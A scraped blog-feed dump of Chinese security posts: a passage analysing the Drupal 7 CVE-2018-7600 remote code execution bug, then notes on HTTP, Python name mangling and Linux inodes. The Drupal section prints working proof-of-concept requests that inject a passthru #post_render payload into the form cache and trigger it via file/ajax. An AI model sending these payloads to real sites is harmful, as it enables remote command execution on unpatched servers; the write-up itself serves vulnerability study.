$original_map); $map = _menu_translate($router_item, $original_map); $router_item['original_map'] = $original_map; if ($map === FALSE) { $router_items[$path] = FALSE; return FALSE; } if ($router_item['access']) { $router_item['map'] = $map; $router_item['page_arguments'] = array_merge(menu_unserialize($router_item['page_arguments'], $map), array_slice($map, $router_item['number_parts'])); $router_item['theme_arguments'] = array_merge(menu_unserialize($router_item['theme_arguments'], $map), array_slice($map, $router_item['number_parts'])); } } **** f**k？反序列化？没错，实际上数据库中存储的是序列数据，这里将数据反序列化了回来。 记得drupal8中的漏洞点ajax吗？ 由于没有8版本那样好的突破点，我们需要先注入恶意攻击代码到数据库中，记录下表单序号，通过表单序号再次请求，让drupal再次运行到ajax处，通过#post_rendert的call_user_func神奇渲染方式执行任意代码。 没错，这就是我们的攻击思路。 好了，那么我们立两个FLAG 注入一个表单ID，我们亲切地叫它：form_build_id 调戏ajax来执行注入的form_build_id biu一个form_build_id进数据库我们先看一下找回密码这个表单(请务必记住我们的flag)，我们看看drupal处理表单的部分代码 123456789101112131415161718192021222324252627282930313233# 文件位置 \\includes\\form.incfunction drupal_process_form($form_id, &amp;$form, &amp;$form_state) { ... if ($form_state['submitted'] &amp;&amp; !form_get_errors() &amp;&amp; !$form_state['rebuild']) { // Execute form submit handlers. form_execute_handlers('submit', $form, $form_state); if (!variable_get('cache', 0) &amp;&amp; !empty($form_state['values']['form_build_id'])) { cache_clear_all('form_' . $form_state['values']['form_build_id'], 'cache_form'); cache_clear_all('form_state_' . $form_state['values']['form_build_id'], 'cache_form'); } if ($batch =&amp; batch_get() &amp;&amp; !isset($batch['current_set'])) { if ($batch['has_form_submits'] || !empty($form_state['rebuild'])) { $batch['form_state'] = $form_state; } else { $batch['form_state'] = array_intersect_key($form_state, array_flip(array('programmed', 'rebuild', 'storage', 'no_redirect', 'redirect'))); } $batch['progressive'] = !$form_state['programmed']; batch_process(); } $form_state['executed'] = TRUE; drupal_redirect_form($form_state); } ... if (($form_state['rebuild'] || !$form_state['executed']) &amp;&amp; !form_get_errors()) { $form_state['rebuild'] = TRUE; $form = drupal_rebuild_form($form_id, $form_state, $form); } } if (!$form_state['rebuild'] &amp;&amp; $form_state['cache'] &amp;&amp; empty($form_state['no_cache'])) { form_set_cache($form['#build_id'], $unprocessed_form, $form_state); } 通过审计我们发现form_set_cache($form['#build_id'], $unprocessed_form, $form_state);是缓存表单信息的函数(别问我为啥，代码审计+翻译注释)，文章篇幅限制就不全贴出来了。 1234/** * Stores a form in the cache. */function form_set_cache($form_build_id, $form, $form_state) { ... } 要想form被缓存。if ($form_state['submitted'] &amp;&amp; !form_get_errors() &amp;&amp; !$form_state['rebuild'])不成立，且if ($form_state['submitted'] &amp;&amp; !form_get_errors() &amp;&amp; !$form_state['rebuild'])成立 即$form_state['submitted']为False 将$form_state['submitted']置为false 那么如何让$form_state['submitted']为false呢？ 在includes/form.inc第886行$form = form_builder($form_id, $form, $form_state);，发现这个函数名像是构建表单，并且第一次使用$form_state，应该是初始化。 跟进form_builder方法，第1987行，发现以下代码。 12345function form_builder($form_id, &amp;$element, &amp;$form_state) { ... if (!empty($form_state['triggering_element']['#executes_submit_callback'])) { $form_state['submitted'] = TRUE; } 当$form_state['triggering_element']['#executes_submit_callback']存在值的时候就为true，那么我们就想办法让这个值为空 正常传递表单的时候$form_state['triggering_element']['#executes_submit_callback']就总会有值 如果没有设置$form_state['triggering_element']，那么$form_state['triggering_element']就设置为第一个button的值，所以… 如何构造一个form能够确保$form_state['triggering_element']['#executes_submit_callback']为空或者说不存在这个数组呢？ 再次调试，表单都是由form.inc的form_builder构造的。其中，_form_builder_handle_input_element()方法对表单先进行了处理，跟进去看一下 12345function form_builder($form_id, &amp;$element, &amp;$form_state) { ... if (!empty($element['#input'])) { _form_builder_handle_input_element($form_id, $element, $form_state); } 这里$form_state['triggering_element']被设置为$element，前提是满足_form_element_triggered_scripted_submission()方法，继续跟入 1234567function _form_builder_handle_input_element($form_id, &amp;$element, &amp;$form_state) { ... if ($process_input) { // Detect if the element triggered the submission via Ajax. if (_form_element_triggered_scripted_submission($element, $form_state)) { $form_state['triggering_element'] = $element; } 代码如下，_triggering_element_value和$element的键值都相等的话，返回true $form_state['triggering_element']赋值为$element，其中不含['#executes_submit_callback'] 12345678function _form_element_triggered_scripted_submission($element, &amp;$form_state) { if (!empty($form_state['input']['_triggering_element_name']) &amp;&amp; $element['#name'] == $form_state['input']['_triggering_element_name']) { if (empty($form_state['input']['_triggering_element_value']) || $form_state['input']['_triggering_element_value'] == $element['#value']) { return TRUE; } } return FALSE;} 根据上述判断，构造请求中包含_triggering_element_name=name 将form_build_id注入数据库 根据PoC，我们传入_triggering_element_name=name ，这里/cve-drupal-7.57/?q=user/password等同于/cve-drupal-7.57/user/password 12345678910111213POST /cve-drupal-7.57/?q=user/password HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: Drupal.toolbar.collapsed=0; Phpstorm-aaa184c4=c189f76e-2434-4686-8e5a-1cc4885784ca; has_js=1; XDEBUG_SESSION=14141Connection: keep-aliveUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 149name=menze3&amp;form_build_id=form-TZ-hbGmj4sUfJXhn8_nPJe4YuxGs8NsL1x7c0gEgLB8&amp;form_id=user_pass&amp;op=E-mail%2Bnew%2Bpassword&amp;_triggering_element_name=name 看到进入这个分支，进入form_set_cache()方法 写入数据库中插入缓存form_build_id 好了，我们注入半个POC 123drupal-7.57/?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=passthru&amp;name%5B%23markup%5D=id&amp;name%5B%23type%5D=markupform_id=user_pass&amp;_triggering_element_name=name 我们打开数据库，扒一扒插入的数据 123456789101112131415161718192021222324252627第一行cid:form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqIdata:drupal-7.57/?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=passthru&amp;name%5B%23markup%5D=id&amp;name%5B%23type%5D=markup\";s:15:\"#theme_wrappers\";a:1:{i:0;s:4:\"form\";}s:5:\"#tree\";b:0;s:8:\"#parents\";a:0:{}s:9:\"#validate\";a:1:{i:0;s:18:\"user_pass_validate\";}s:7:\"#submit\";a:1:{i:0;s:16:\"user_pass_submit\";}s:6:\"#theme\";a:1:{i:0;s:9:\"user_pass\";}}expire:1533738649created:1533717049serialized:1第二行同form_state_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqIa:6:{s:10:\"build_info\";a:3:{s:4:\"args\";a:0:{}s:7:\"form_id\";s:9:\"user_pass\";s:5:\"files\";a:1:{s:4:\"menu\";s:27:\"modules/user/user.pages.inc\";}}s:10:\"programmed\";b:0;s:30:\"programmed_bypass_access_check\";b:1;s:5:\"cache\";b:0;s:13:\"process_input\";b:1;s:13:\"invalid_token\";b:0;}153373864915337170491 是序列化数据没错了，而且是将我们的Get请求数据存储。 代码执行现场既然我们完成了第一个FLAG，现在只需要让他执行第一个FLAG.吼吼吼，小激动。 这次我们请求和Drupal8的漏洞点，还是处理图片那个点，这里我先列出POC 12get: ?q=file/ajax/name/%23value/form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqIpost: form_build_id:form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI （后面是CID号，这里我直接从上面取了一个），后续我会一点一点解释。我们这里跟随一下 1234567891011121314151617function menu_get_item($path = NULL, $router_item = NULL) { $router_items = &amp;drupal_static(__FUNCTION__); if (!isset($path)) { $path = $_GET['q']; } if (isset($router_item)) { $router_items[$path] = $router_item;# 将q的值取为键，而本身作为值，也就是NULL. } if (!isset($router_items[$path])) { // Rebuild if we know it's needed, or if the menu masks are missing which // occurs rarely, likely due to a race condition of multiple rebuilds. if (variable_get('menu_rebuild_needed', FALSE) || !variable_get('menu_masks', array())) { if (_menu_check_rebuild()) { menu_rebuild(); } } $original_map = arg(NULL, $path); # 将file/ajax/name/%23value/form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI解析出一个数组，如下图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 $parts = array_slice($original_map, 0, MENU_MAX_PARTS); $ancestors = menu_get_ancestors($parts); .../** * Returns a component of the current Drupal path. * * When viewing a page at the path \"admin/structure/types\", for example, arg(0) * returns \"admin\", arg(1) returns \"structure\", and arg(2) returns \"types\". * * Avoid use of this function where possible, as resulting code is hard to * read. In menu callback functions, attempt to use named arguments. See the * explanation in menu.inc for how to construct callbacks that take arguments. * When attempting to use this function to load an element from the current * path, e.g. loading the node on a node page, use menu_get_object() instead. * * @param $index * The index of the component, where each component is separated by a '/' * (forward-slash), and where the first component has an index of 0 (zero). * @param $path * A path to break into components. Defaults to the path of the current page. * * @return * The component specified by $index, or NULL if the specified component was * not found. If called without arguments, it returns an array containing all * the components of the current path. */function arg($index = NULL, $path = NULL) { // Even though $arguments doesn't need to be resettable for any functional // reasons (the result of explode() does not depend on any run-time // information), it should be resettable anyway in case a module needs to // free up the memory used by it. // Use the advanced drupal_static() pattern, since this is called very often. static $drupal_static_fast; if (!isset($drupal_static_fast)) { $drupal_static_fast['arguments'] = &amp;drupal_static(__FUNCTION__); } $arguments = &amp;$drupal_static_fast['arguments']; if (!isset($path)) { $path = $_GET['q']; } if (!isset($arguments[$path])) { $arguments[$path] = explode('/', $path); } if (!isset($index)) { return $arguments[$path]; } if (isset($arguments[$path][$index])) { return $arguments[$path][$index]; }} 代码较长，我这里分段一下，上面的代码可以看到，$router_items[$path] = $router_item，而此时我们传入的是?q=file/ajax/name/#value/cid 12345678910111213141516171819202122 $router_item = db_query_range('SELECT * FROM {menu_router} WHERE path IN (:ancestors) ORDER BY fit DESC', 0, 1, array(':ancestors' =&gt; $ancestors))-&gt;fetchAssoc(); if ($router_item) { // Allow modules to alter the router item before it is translated and // checked for access. drupal_alter('menu_get_item', $router_item, $path, $original_map); $map = _menu_translate($router_item, $original_map); $router_item['original_map'] = $original_map; if ($map === FALSE) { $router_items[$path] = FALSE; return FALSE; } if ($router_item['access']) { $router_item['map'] = $map; $router_item['page_arguments'] = array_merge(menu_unserialize($router_item['page_arguments'], $map), array_slice($map, $router_item['number_parts'])); $router_item['theme_arguments'] = array_merge(menu_unserialize($router_item['theme_arguments'], $map), array_slice($map, $router_item['number_parts'])); } } $router_items[$path] = $router_item; }return $router_items[$path];} 查询之后的结果如下： 到这里，我的$router_item['page_callback']为file_ajax_upload，我们看看在哪里执行地，继续跟 123456789101112131415161718192021222324# index.phpdrupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);menu_execute_active_handler(); &lt;--运行到inde.php的代理，看看代理了啥# 我跟~function menu_execute_active_handler($path = NULL, $deliver = TRUE) { // Check if site is offline. $page_callback_result = _menu_site_is_offline() ? MENU_SITE_OFFLINE : MENU_SITE_ONLINE; // Allow other modules to change the site status but not the path because that // would not change the global variable. hook_url_inbound_alter() can be used // to change the path. Code later will not use the $read_only_path variable. $read_only_path = !empty($path) ? $path : $_GET['q']; drupal_alter('menu_site_status', $page_callback_result, $read_only_path); // Only continue if the site status is not set. if ($page_callback_result == MENU_SITE_ONLINE) { if ($router_item = menu_get_item($path)) { if ($router_item['access']) { if ($router_item['include_file']) { require_once DRUPAL_ROOT . '/' . $router_item['include_file']; } $page_callback_result = call_user_func_array($router_item['page_callback'], $router_item['page_arguments']);# 执行传入函数 ... 这里执行的是$router_item['page_callback']，而传入的$router_item['page_arguments']就是从数据库中提取出的我们事先准备好的代码。 错，还没完呢，如果你以为这里地$router_item['page_arguments']这个是我们地缓存，那你就大错特错了。 123456789101112function file_ajax_upload() { $form_parents = func_get_args(); $form_build_id = (string) array_pop($form_parents); if (empty($_POST['form_build_id']) || $form_build_id != $_POST['form_build_id']) { # 注意这个$_POST['form_build_id'] // Invalid request. drupal_set_message(t('An unrecoverable error occurred. The uploaded file likely exceeded the maximum file size (@size) that this server supports.', array('@size' =&gt; format_size(file_upload_max_size()))), 'error'); $commands = array(); $commands[] = ajax_command_replace(NULL, theme('status_messages')); return array('#type' =&gt; 'ajax', '#commands' =&gt; $commands); } 这里我再断开这个函数，上述中我们看到empty($_POST['form_build_id']) || $form_build_id != $_POST['form_build_id']，现在知道它存在的意义了吗，没有或者与请求中不相等就直接凉凉了。 12345678910111213141516171819 list($form, $form_state, $form_id, $form_build_id, $commands) = ajax_get_form();# 真正提取数据库缓存的是ajax_get_form()函数# 跟进瞧瞧function ajax_get_form() { $form_state = form_state_defaults(); $form_build_id = $_POST['form_build_id']; // Get the form from the cache. $form = form_get_cache($form_build_id, $form_state); if (!$form) { // If $form cannot be loaded from the cache, the form_build_id in $_POST // must be invalid, which means that someone performed a POST request onto // system/ajax without actually viewing the concerned form in the browser. // This is likely a hacking attempt as it never happens under normal // circumstances, so we just do nothing. watchdog('ajax', 'Invalid form POST data.', array(), WATCHDOG_WARNING); drupal_exit(); } 到此，我们实现了第二个FLAG，而且我们知道了： 发送两个数据包的原因 两个数据包的构造要点 咋一看都是小漏洞，但是合到一起就是高危的远程代码执行漏洞啊 。。。","link":"/2018/08/02/2018/Drupal%20CVE2018-7600/"},{"title":"HTTP协议","text":"在被一次裸面之后发现自己什么都记不住，回来总结一下，不过主要还是给丁神看看。 HTTP方法 GET GET方法用来请求访问已被URI识别的资源，制定的资源经服务器端解析后返回响应内容。 POST POST方法用来传输实体的主体，虽然GET方法也可以但一般不用GET方法传输实体的主体。 PUT PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件的内容，然后保存到请求URI指定的位置。 HEAD HEAD方法和GET方法一样，只是不返回报文主体部分，用于确认URI的有效性及资源更新的日期时间。 DELETE DELETE方法用来删除文件，是与PUT方法相反的方法。 OPTION OPTION方法用来查询针对请求URI指定的资源支持的方法。 TRACE TRACE方法是让WEB服务器端将之前的请求通信环回给客户端的方法。 CONNECT CONNECT方法要求在代理服务器通信时建立隧道，实现隧道协议进行TCP通信。 HTTP报文信息HTTP通信过程包括从客户端发往服务器端的请求及从服务器端返回客户端的响应。 用于HTTP协议交互的信息被称为HTTP报文。请求端（客户端）的HTTP报文叫请求报文，响应端（服务器端）的叫做响应报文。HTTP报文大致可分为报文首部和报文主体两块，两者由最初出现的空行来划分，通常并不一定要有报文主体。 请求体1 1234567891011GET /company-information/172630.html HTTP/1.1Host: www.menzel3.funConnection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: https://www.google.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=5od4iiubogrfj3dv7edj8r2db7 响应体1 1234567891011HTTP/1.1 200 OKDate: Thu, 11 Oct 2018 14:38:22 GMTContent-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedConnection: keep-aliveServer: Apache/2.2.21Vary: CookieX-Pingback: http://www.freebuf.com/xmlrpc.phpLink: &lt;http://www.freebuf.com/?p=172630&gt;; rel=shortlinkContent-Encoding: gzipVary: Accept-Encoding 请求体2 123456789101112131415POST /login HTTP/1.1Host: account.tophant.comConnection: keep-aliveContent-Length: 60Accept: application/json, text/javascript, */*; q=0.01Origin: https://account.tophant.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: https://account.tophant.com/login.html?response_type=code&amp;client_id=b611bfe4ef417dbc&amp;state=b694a03f5f83a06ac7ebd7ee338e7fc6Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=4tos7vd93p41ms1dt43dapq2i4username=a&amp;password=a&amp;token=bdc83717800bce95d0d718fddf6075a5 编码传输编码提升传输速率，HTTP在传输数据时可以按照数据原貌直接传输，但也可以在传输过程中通过编码提升传输速率。在传输时编码，能有效地处理大量的访问请求。 报文主体和实体主体：报文：HTTP通信中的基本单位； 实体：作为请求或响应的有效载荷数据被传输，其内容由实体首部和实体主体组成。 HTTP报文的主体用于传输请求或者响应实体的主体。通常报文主体就等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。 压缩传输的内容编码内容编码指明应用在石头内容上的编码格式，并保持实体信息原样压缩，内容编码后的实体由客户端接收并负责解码。 常用的内容编码有以下几种： gzip（GUN zip） compress（UNIX系统的标准压缩） deflate（zlib） identify（不进行编码） 分割发送的分块传输编码请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过吧数据分割成多块，能够让浏览器逐步显示页面。这种吧实体主体分块的功能称为分块传输编码 一次多数据MIME机制，多用于发送如文本、图片、视频、音频等多种不同类型的数据。 参考链接 范围请求多用于请求一个较大的资源时，我们没有办法一次性传输完成，这时候我们就可以使用这种一个范围一个范围地传输内容，也是断点续传、多线程下载地核心。 参考链接 内容协商内容协商制是指客户端和服务器端就响应的资源进行交涉，然后提供给客户最为合适的资源，内容协商会以响应资源的语言、字符集、编码方式等作为判断基准，最终返回最合适的内容。 三种类型：： 服务器驱动协商 客户端驱动协商 透明协商（上面两种的结合） 参考链接 HTTP状态码HTTP状态码负责表示客户端HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等。 状态码类型： 类别 原因短语 1XX Informational(信息状态码) 接受的请求正在处理 2XX Succ(成功状态吗) 请求正常处理完毕 3XX Redirection(重定向状态码) 需要进行附加操作以完成请求 4XX Client Error(客户端错误状态码) 服务器无法处理请求 5XX Server Error(服务器错误状态码) 服务器处理请求出错 常见状态码： 状态码 状态码英文名称 中文描述 100 Continue 继续。客户端应继续其请求 101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 200 OK 请求成功。一般用于GET与POST请求 204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 206 Partial Content 部分内容。服务器成功处理了部分GET请求 301 Moved Permanently 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI 303 See Other 查看其它地址。与301类似。使用GET和POST请求查看 304 Not Modified 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 305 Use Proxy 使用代理。所请求的资源必须通过代理访问 307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向 400 Bad Request 客户端请求的语法错误，服务器无法理解 401 Unauthorized 请求要求用户的身份认证 403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求 404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 408 Request Time-out 服务器等待客户端发送的请求时间过长，超时 500 Internal Server Error 服务器内部错误，无法完成请求 501 Not Implemented 服务器不支持请求的功能，无法完成请求 502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求 503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求 505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理 Web服务器单机多域HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器。 通信数据转发程序代理接收客户端的请求并转发给服务器，同时也接收服务器的响应返回给客户端。 使用代理服务器的理由： 利用缓存技术减少带宽的流量，组织内部针对网站的控制，以获取访问日志为主要目的等。 代理按照使用方法的分类： 缓存代理：代理转发响应式，缓存代理会先将资源的副本保存在代理服务器上。 透明代理：转发请求或响应时，不对报文做任何加工的代理类型称为透明代理，反之则称为非透明代理。 网关接收客户端发过来的请求并对其进行处理。 网关的工作机制和代理十分相似。而且网关能使通信线路上的服务器提供非HTTP协议服务。利用网关还能提高通信的安全性，因为在客户端与网关之间的通信线路上加密以确保连接的安全。 隧道在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。 隧道可按照要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身并不会去解析HTTP请求，隧道会在通信双方断开连接时结束。 HTTP首部HTTP报文首部HTTP请求报文：在请求中，HTTP报文由方法，URL，HTTP版本和HTTP首部字段等构成； HTTP响应报文：在响应中，HTTP报文由HTTP版本，状态码，HTTP首部三个部分组成。 HTTP首部字段在客户端和服务器之间以HTTP协议进行通信的过程中，无论是请求还是响应都会使用到首部字段，它能起到传递额外重要信息的作用。 四种HTTP首部字段类型： 通用首部字段（General Header Fields）: 请求报文和响应报文两方都会使用的首部； 请求首部字段（Request Header Fields）: 从客户端向服务器发送请求报文时使用的首部。补充了请求的附加内容，客户端的信息，响应内容相关的优先级等信息。 响应首部字段（Response Header Fields）: 从服务器向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。 实体首部字段（Entity Header Fields）: 针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。 HTTP首部字段一览表通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 逐跳首部，连接的管理 Date 创建报文的日期时间 Pragna 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept—Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web认证信息 Expect 期待服务器的指定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 if-Match 比较实体标记（ETag） if-Modified-Since 比较资源的更新时间 if-None-Match 比较实体标记（与if-Match相反） if-Range 资源为更新时发送实体Byte的范围请求 if-Unmodified-Since 比较资源的更新时间（与if-Modified-Since相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体字节范围请求 Referer 对请求中的URL的原始获取方法 TE 传输编码的优先级 User-Agent HTTP客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定的URL Proxy-Authenticate 代理服务器对客户端的认证信息 Rety-After 对再次发起请求的时机要求 Server HTTP服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 首部字段名 说明 Allow 资源科支持的HTTP方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小（单位：字节） Content-Location 替代对资源的URL Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 为Cookie服务的首部字段 首部字段名 说明 首部类型 Set-Cookie 开始状态管理所有的Cookie信息 响应首部字段 Cookie 服务器接收到的Cookie信息 请求首部字段 Set—Cookie字段的属性 属性 说明 NAME=VALUE 赋予Cookie的名称和其值 expires=DATE Cookie的有效期（若不mingque指定则默认为浏览器关闭前为止） path=PATH 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的目录） domain=域名 作为Cookie适用对象的域名（若不指定则默认为创建Cookie的服务器的域名） Scure 仅在HTTPS安全通信时才会发送Cookie HttpOnly 加以限制，使Cookie不能被JavaScript脚本访问","link":"/2018/08/20/2018/HTTP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"},{"title":"Python私有化","text":"Python对私有化的实现原理，大佬略过. 在8月一次外出培训讲解Python的过程中，一个巧合颠覆了我对Python的认知，看如下代码： 12345678910111213141516171819202122class Msg: def __init__(self, money): self.__money = money self._money = money def getMoney(self): return self.__money def __sendMsg(self): print(\"---正在发送短信--\") def sendMsg(self): if (self.getMoney() &gt; 100): self.__sendMsg() else: print(\"余额不足\")if __name__ == '__main__': msg = Msg(10) msg._Msg__money = '1000' print(msg.sendMsg()) 大家猜猜这个输出会是什么？是余额不足还是短信发送。 都这么问了，肯定是短信发送了。 如果是未接触过的人，可能有点懵，这里我们去命令行下调试： 1234567891011121314151617&gt;&gt;&gt; class Msg:... def __init__(self, money):... self.__money = money... self._money = money... def getMoney(self):... return self.__money... def __sendMsg(self):... print(\"---正在发送短信--\")... def sendMsg(self):... if (self.getMoney() &gt; 100):... self.__sendMsg()... else:... print(\"余额不足\")...&gt;&gt;&gt; msg = Msg(10)&gt;&gt;&gt; dir(msg)['_Msg__money', '_Msg__sendMsg', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_money', 'getMoney', 'sendMsg', 'setMoney'] 看到这里，细心的人会发现类的私有元素，相对应的都有一个_Msg加私有元素名，而这是什么呢，可能大家已经猜到了。 我来做如下测试： 12345678&gt;&gt;&gt; msg._Msg__money10&gt;&gt;&gt; msg.__moneyTraceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AttributeError: 'Msg' object has no attribute '__money'&gt;&gt;&gt; msg.getMoney() is msg._Msg__moneyTrue 好了，我们去查阅一下官方文档 9.6. 私有变量Python中不存在除对象内部之外无法访问的“私有”实例变量。但是，大多数Python代码都遵循一个约定：以下划线（例如_spam）为前缀的名称应被视为API的非公共部分（无论是函数，方法还是数据成员）。它应被视为实施细节，如有更改，恕不另行通知。 由于类私有成员有一个有效的用例（即为了避免名称与子类定义的名称冲突），因此对这种称为名称修改的机制的支持有限。表单的任何标识符__spam（至少两个前导下划线，最多一个尾随下划线）在文本上替换为_classname__spam，其中classname当前类名称带有前导下划线。只要它出现在类的定义中，就可以在不考虑标识符的句法位置的情况下完成这种修改。 名称修改有助于让子类覆盖方法而不破坏类内方法调用。例如： 123456789101112131415161718class Mapping: def __init__(self, iterable): self.items_list = [] self.__update(iterable) def update(self, iterable): for item in iterable: self.items_list.append(item) __update = update # private copy of original update() methodclass MappingSubclass(Mapping): def update(self, keys, values): # provides new signature for update() # but does not break __init__() for item in zip(keys, values): self.items_list.append(item) 请注意，修剪规则主要是为了避免事故; 它仍然可以访问或修改被视为私有的变量。这在特殊情况下甚至可能很有用，例如在调试器中。 请注意，代码传递给exec()或eval()不将调用类的类名视为当前类; 这类似于global语句的效果，其效果同样限于字节编译在一起的代码。同样的限制也适用于 getattr()，setattr()与delattr()，以及引用时为 __dict__直接。","link":"/2018/09/10/2018/Python3%E7%A7%81%E6%9C%89%E5%8C%96/"},{"title":"Linux&#x2F;unix上神奇的inode编号","text":"Linux/unix上神奇的inode编号 inode使用通过inode删除文件linux下有一些文件比较特别，无法直接删除或者容易误删除成其他文件。删除这类文件时，可以不通过文件名，可以通过inode号进行删除。 例如，这里有一个文件名为“－” ，可以通过以下步骤进行删除。 1[root@361way ~]# ll总用量 6856-rw-r--r-- 1 root root 1040 10月 30 2013 – 使用ls -i 或ls -li查看文件的inode号 1[root@361way ~]# ls -il总用量 6860271761664 -rw-r--r-- 1 root root 1040 10月 30 2011 – 使用find接inode号查找到文件或再进行删除 1[root@361way ~]# find . -inum 271761664 -exec rm -i {} \\;rm：是否删除普通文件 \"./–\"？y 为避免删错文件，这里使用了rm的交互式删除。不需要交互时，可以将rm后的-i 去掉，也可以直接使用delete进行删除： 1# find . -inum 271761664 -delete 通过inode查找文件1find . -inum 271761664 取证查询inode深度理解什么是inode理解inode，要从文件储存说起。 文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。 操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。 文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。 每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 inode的内容inode包含文件的元信息，具体来说有以下内容： * 文件的字节数 * 文件拥有者的User ID * 文件的Group ID * 文件的读、写、执行权限 * 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 * 链接数，即有多少文件名指向这个inode * 文件数据block的位置 可以用stat命令，查看某个文件的inode信息： stat example.txt 123456789mzl@ubuntu:~$ stat code/ File: 'code/' Size: 4096 Blocks: 8 IO Block: 4096 directoryDevice: 801h/2049d Inode: 149183 Links: 3Access: (0775/drwxrwxr-x) Uid: ( 1000/ mzl) Gid: ( 